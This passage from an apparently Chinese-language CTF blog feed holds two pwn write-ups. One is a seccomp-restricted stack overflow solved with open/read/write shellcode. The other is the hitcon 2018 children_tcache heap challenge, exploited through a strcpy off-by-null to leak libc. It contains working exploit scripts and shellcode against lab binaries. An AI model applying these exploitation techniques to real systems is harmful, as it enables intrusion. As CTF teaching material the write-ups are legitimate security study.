class="comment">// gcc -g orw.c -o orw -lseccomp -fno-stack-protector -no-pie -z execstack </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;jmp *%rsp;&quot;</span>  <span class="comment">// è·³è½¬åˆ° rsp å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret;&quot;</span>         <span class="comment">// è¿”å›</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwn@ctfpwn:~/learn/Seccomp/test$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure></div><ul><li>ç¦ç”¨äº†<code>execve</code>ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥å†™execveçš„shellcodeå»get shellï¼Œä½†éš¾é“æ²¡æœ‰å…¶ä»–æ–¹æ³•äº†å—ï¼Ÿ</li><li>è¿™é“é¢˜ç›®å°±æ˜¯ç»å…¸çš„<code>orw</code>ï¼Œ<code>open</code>è¯»flag,<code>read</code>å°†å…¶å‚¨å­˜åˆ°bufï¼Œæœ€å<code>write</code>è¾“å‡ºå‡ºæ¥ï¼Œè¿™é“é¢˜ç›®å°±å¯ä»¥ç›´æ¥æ‰“<code>orw</code>ï¼Œå…ˆå¸ƒç½®å¥½<code>shellcode</code>ç„¶åjmpåˆ°rspå†æ‰§è¡Œshellcode</li><li>æ–¹æ³•å‚è€ƒï¼š<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/139296136">è¿™ç¯‡æ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">p = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = shellcraft.sh()</span></span><br><span class="line"><span class="comment">#payload = cyclic(0x108)+asm(shellcode)</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">jmp_rsp = <span class="number">0x00000000004011de</span></span><br><span class="line">payload = asm(shellcode).ljust(<span class="number">0x108</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(ret) + p64(jmp_rsp)</span><br><span class="line">payload += asm(<span class="string">&#x27;sub rsp, 0x118&#x27;</span>)</span><br><span class="line">payload += asm(<span class="string">&#x27;jmp rsp&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>æ•ˆæœï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113221927501.bmp"></p><h2 id="æ‰‹å†™æ±‡ç¼–"><a href="#æ‰‹å†™æ±‡ç¼–" class="headerlink" title="æ‰‹å†™æ±‡ç¼–"></a>æ‰‹å†™æ±‡ç¼–</h2><ul><li>å…ˆä»‹ç»ä¸€ä¸‹ä¸‰ä¸ªå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ64ä½æƒ…å†µä¸‹)</li></ul><blockquote><p><code>open</code> ç³»ç»Ÿè°ƒç”¨ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶è¿”å›æ–‡ä»¶æè¿°ç¬¦ã€‚</p><p><strong>ç³»ç»Ÿè°ƒç”¨å·</strong>: 2</p><p><strong>å¯„å­˜å™¨ä¼ é€’å‚æ•°</strong>:</p><ul><li><strong><code>rax</code></strong> &#x3D; 2ï¼ˆ<code>open</code> çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰</li><li><strong><code>rdi</code></strong> &#x3D; æ–‡ä»¶è·¯å¾„ï¼ˆ<code>const char *pathname</code>ï¼‰</li><li><strong><code>rsi</code></strong> &#x3D; æ ‡å¿—ï¼ˆ<code>int flags</code>ï¼Œä¾‹å¦‚ <code>O_RDONLY</code>ã€<code>O_WRONLY</code>ã€<code>O_RDWR</code> ç­‰ï¼‰</li><li><strong><code>rdx</code></strong> &#x3D; æ¨¡å¼ï¼ˆ<code>mode_t mode</code>ï¼Œç”¨äº <code>O_CREAT</code> æ ‡å¿—æ—¶æŒ‡å®šæ–‡ä»¶æƒé™ï¼‰</li></ul></blockquote><blockquote><p><code>read</code> ç³»ç»Ÿè°ƒç”¨ç”¨äºä»æ–‡ä»¶æè¿°ç¬¦è¯»å–æ•°æ®ã€‚</p><p><strong>ç³»ç»Ÿè°ƒç”¨å·</strong>: 0</p><p><strong>å¯„å­˜å™¨ä¼ é€’å‚æ•°</strong>:</p><ul><li><strong><code>rax</code></strong> &#x3D; 0ï¼ˆ<code>read</code> çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰</li><li><strong><code>rdi</code></strong> &#x3D; æ–‡ä»¶æè¿°ç¬¦ï¼ˆ<code>int fd</code>ï¼‰</li><li><strong><code>rsi</code></strong> &#x3D; ç¼“å†²åŒºï¼ˆ<code>void *buf</code>ï¼‰</li><li><strong><code>rdx</code></strong> &#x3D; è¦è¯»å–çš„å­—èŠ‚æ•°ï¼ˆ<code>size_t count</code>ï¼‰</li></ul></blockquote><blockquote><p><code>write</code> ç³»ç»Ÿè°ƒç”¨ç”¨äºå‘æ–‡ä»¶æè¿°ç¬¦å†™å…¥æ•°æ®ã€‚</p><p><strong>ç³»ç»Ÿè°ƒç”¨å·</strong>: 1</p><p><strong>å¯„å­˜å™¨ä¼ é€’å‚æ•°</strong>:</p><ul><li><strong><code>rax</code></strong> &#x3D; 1ï¼ˆ<code>write</code> çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰</li><li><strong><code>rdi</code></strong> &#x3D; æ–‡ä»¶æè¿°ç¬¦ï¼ˆ<code>int fd</code>ï¼‰</li><li><strong><code>rsi</code></strong> &#x3D; ç¼“å†²åŒºï¼ˆ<code>const void *buf</code>ï¼‰</li><li><strong><code>rdx</code></strong> &#x3D; è¦å†™å…¥çš„å­—èŠ‚æ•°ï¼ˆ<code>size_t count</code>ï¼‰</li></ul></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">/* open(&#x27;flag&#x27;) */</span><br><span class="line">push 0x67616c66;</span><br><span class="line">mov rdi, rsp;  // æ³¨æ„ä¸è¦pop, ä¸ç„¶åé¢ä¸èƒ½ç›´æ¥mov rsi, rsp;</span><br><span class="line">xor rsi, rsi;</span><br><span class="line">xor rdx, rdx;</span><br><span class="line">push 2;</span><br><span class="line">pop rax;</span><br><span class="line">syscall;</span><br><span class="line"></span><br><span class="line">/* read(3,&#x27;rsp&#x27;,0x30) */</span><br><span class="line">push 3; pop rdi;</span><br><span class="line">push 0x30; pop rdx;</span><br><span class="line">mov rsi, rsp;</span><br><span class="line">xor rax, rax;</span><br><span class="line">syscall;</span><br><span class="line"></span><br><span class="line">/* write(1,&#x27;rsp&#x27;,0x30) */</span><br><span class="line">push 1; pop rdi;</span><br><span class="line">mov rsi, rsp;</span><br><span class="line">push 0x30; pop rdx;</span><br><span class="line">push 1; pop rax;</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> seccomp </tag>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcon_2018_children_tcache</title>
      <link href="/2024/11/09/hitcon-2018-children-tcache/"/>
      <url>/2024/11/09/hitcon-2018-children-tcache/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><code>off_by_null``Glibc2.27``Double Free</code></p><p>ç¬¬ä¸€æ¬¡é‡åˆ°<code>off_by_null</code>,å…³é”®å‡½æ•°æ˜¯<code>strcpy</code></p><p><mark>è¯¥é¢˜ç›®è¦æœ‰è¾ƒå¼ºçš„åˆ†æèƒ½åŠ›ï¼Œæ—¶åˆ»æ˜ç™½chunkè¢«åˆ†é…ç»™è°äº†ï¼ï¼ï¼ï¼<mark></mark></mark></p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-2034h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-2030h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-2028h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8216</span>]; <span class="comment">// [rsp+20h] [rbp-2020h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+2038h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x2010</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123; <span class="comment">// ä»0å¼€å§‹å¾ªç¯+1ï¼Œæœ‰ç©ºé—²çš„å°±ç”¨</span></span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !heaplist[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = input();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  dest = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  my_read(s, size);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, s);                              <span class="comment">// off_by_null</span></span><br><span class="line">  heaplist[i] = dest;</span><br><span class="line">  sizelist[i] = size;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_E4B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v2 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  v0 = *(&amp;heaplist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(*(&amp;heaplist + v2));</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><ul><li>å°†<code>user data</code>å…¨éƒ¨è¦†ç›–ä¸º<code>0xDA</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heaplist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(heaplist[v1], <span class="number">0xDA</span>, sizelist[v1]);</span><br><span class="line">    <span class="built_in">free</span>(heaplist[v1]);</span><br><span class="line">    heaplist[v1] = <span class="number">0LL</span>;</span><br><span class="line">    sizelist[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><ul><li><code>strcpy</code>æœ‰off_by_null,å®ƒä¼šåœ¨å¤åˆ¶å®Œä¹‹åçš„å­—ç¬¦ä¸²åŠ ä¸Š<code>\x00</code>ï¼Œå‡è®¾æˆ‘ä»¬<code>malloc(0x68)</code>å¹¶ä¸”å°†0x68å¡«å……å®Œï¼Œé‚£ä¹ˆå¤šä½™çš„<code>\x00</code>å°±ä¼šè¦†ç›–åˆ°ä¸‹ä¸€ä¸ªchunkçš„size</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *start = dest;            <span class="comment">// ä¿å­˜èµ·å§‹ä½ç½®ï¼Œæ–¹ä¾¿è¿”å›</span></span><br><span class="line">    <span class="keyword">while</span> ((*dest++ = *src++) != <span class="string">&#x27;\0&#x27;</span>);  <span class="comment">// é€å­—ç¬¦å¤åˆ¶ç›´åˆ°é‡åˆ° `\0`</span></span><br><span class="line">    <span class="keyword">return</span> start;                  <span class="comment">// è¿”å›ç›®æ ‡å­—ç¬¦ä¸²çš„æŒ‡é’ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>åœ¨<code>add</code>å‡½æ•°å†…éƒ¨æœ‰ç€ä¸€å±‚å¾ªç¯ï¼Œåªè¦<code>heaplist[i]=0</code>å°±ä¼šæ‹¿æ¥æ¥æ”¶mallocçš„æŒ‡é’ˆ</li><li>è¿™é‡Œçš„freeå°†ä¼šå¡«å……user_dataä¸º0xdaï¼Œæ™®é€šçš„<code>unsorted bin arrack</code>æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>off_by_null</code>å»ä¿®æ”¹</li><li>äºæ˜¯æˆ‘ä»¬å¯ä»¥å…ˆmallocä¸¤ä¸ªchunkï¼Œç¬¬ä¸€ä¸ªmalloc(0x420)ä¸ºäº†ä¹‹åfreeè¿›å…¥<code>unsorted bin</code>ï¼Œç„¶åç¬¬äºŒä¸ªmalloc(0xn8)ï¼Œé€šè¿‡addçš„æ¼æ´å’Œ<code>off_by_null</code>æˆ‘ä»¬å¯ä»¥æŒç»­çš„ä¿®æ”¹chunk1(ä»0å¼€å§‹è®¡æ•°)çš„ä¸‹ä¸€ä¸ªchunkçš„<code>prev_size</code>ï¼Œç„¶åå¯ä»¥ä½¿å¾—free chunkåˆå¹¶ï¼Œç„¶åå°±æ˜¯ç®€å•çš„<code>double free</code></li></ul><h1 id="gdbè¯¦è§£"><a href="#gdbè¯¦è§£" class="headerlink" title="gdbè¯¦è§£"></a>gdbè¯¦è§£</h1><h2 id="æ”¹prev-size-0"><a href="#æ”¹prev-size-0" class="headerlink" title="æ”¹prev_size&#x3D;0"></a>æ”¹prev_size&#x3D;0</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x420</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;2&#x27;</span>) <span class="comment"># å¿…é¡»æ˜¯0x4f0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>): <span class="comment"># å•å­—èŠ‚ä¿®æ”¹prev_size</span></span><br><span class="line">    add(<span class="number">0x68</span>-i,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x68</span>-i))</span><br><span class="line">    free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><ul><li>åœ¨forå¾ªç¯ä¸­ï¼Œæˆ‘ä»¬æ¯æ¬¡mallocçš„å…¶å®éƒ½æ˜¯tcacheä¸­çš„chunkï¼Œä¹Ÿå°±æ˜¯<code>chunk1</code>,ä½†æ˜¯ç¨‹åºæ˜¯å°†å®ƒç»™äº†heaplist[0]ï¼Œæ‰€ä»¥free[0]åªä¼šå°†heaplist[0]ä¹Ÿå°±æ˜¯chunk0çš„user_dataè¦†ç›–ä¸º0xDA,è€Œä¸å½±å“chunk1</li><li><font color="red">è§£é‡Šä¸€ä¸‹forå¾ªç¯ä¸­çš„</font></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i=<span class="number">0</span>æ—¶ï¼Œå¡«å……<span class="number">0x68</span>ï¼Œæº¢å‡º\x00å¡«å……chunk2çš„sizeæœ«å­—èŠ‚ï¼Œå³size=<span class="number">0x500</span></span><br><span class="line">i=<span class="number">1</span>æ—¶ï¼Œå¡«å……<span class="number">0x67</span>ï¼Œä¿®æ”¹prev_sizeæœ«å­—èŠ‚ä¸º\x00,ç›¸å½“äºb<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x67</span>+b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure></div><ul><li>æ•ˆæœï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109162313762.bmp" alt="forå¾ªç¯ä¹‹å‰"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109162346023.bmp" alt="forå¾ªç¯ä¹‹å"></p><h2 id="åˆå¹¶free-chunk-leak-libc"><a href="#åˆå¹¶free-chunk-leak-libc" class="headerlink" title="åˆå¹¶free chunk+leak_libc"></a>åˆå¹¶free chunk+leak_libc</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,cyclic(<span class="number">0x60</span>)+p64(<span class="number">0x4a0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x420</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x10</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x60</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br></pre></td></tr></table></figure></div><ul><li>å†æ¬¡addè¿˜æ˜¯ä¿®æ”¹chunk1ï¼Œæ­¤æ—¶æ˜¯ä¸ºäº†ä¿®æ”¹prev_sizeï¼Œå¯¼è‡´free(2)çš„æ—¶å€™free chunkåˆå¹¶ï¼Œä¸‹é¢add(0x420)åˆ†ç†å‡ºchunk1,ç„¶åshow(0)å°±ä¼šå¾—åˆ°<code>main_arenaé™„è¿‘çš„å€¼</code>ï¼Œä½†æ˜¯<code>unsorted bin</code>çš„fdå’Œbkä¸åº”è¯¥æ˜¯åœ¨freeçŠ¶æ€ä¸‹æ‰æœ‰çš„å—ï¼ŸğŸ¤¨æˆ‘ä»¬æŸ¥çœ‹æ­¤æ—¶å †ç»“æ„ï¼š</li></ul><p><img lazyload src="/images/loading.svg" 